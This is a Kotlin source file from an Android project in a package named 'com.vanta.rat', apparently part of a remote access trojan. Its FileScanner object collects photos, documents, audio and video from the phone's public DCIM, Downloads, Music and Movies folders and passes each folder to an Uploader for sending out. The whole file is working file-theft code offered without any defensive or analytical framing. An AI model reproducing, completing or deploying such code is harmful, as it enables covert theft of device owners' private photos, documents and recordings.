package com.vanta.rat

import android.os.Environment
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object FileScanner {
    private val IMAGES = listOf("jpg","jpeg","png","webp","heic")
    private val DOCS   = listOf("pdf","doc","docx","xls","xlsx","txt","csv")
    private val AUDIO  = listOf("mp3","m4a","wav","ogg")
    private val VIDEO  = listOf("mp4","mkv","3gp","mov")

    suspend fun uploadImages() = withContext(Dispatchers.IO) {
        val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
        Uploader.sendDirectory(dir, IMAGES)
    }

    suspend fun uploadDocuments() = withContext(Dispatchers.IO) {
        val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
        Uploader.sendDirectory(dir, DOCS)
    }

    suspend fun uploadAudio() = withContext(Dispatchers.IO) {
        val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC)
        Uploader.sendDirectory(dir, AUDIO)
    }

    suspend fun uploadVideo() = withContext(Dispatchers.IO) {
        val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES)
        Uploader.sendDirectory(dir, VIDEO)
    }
}
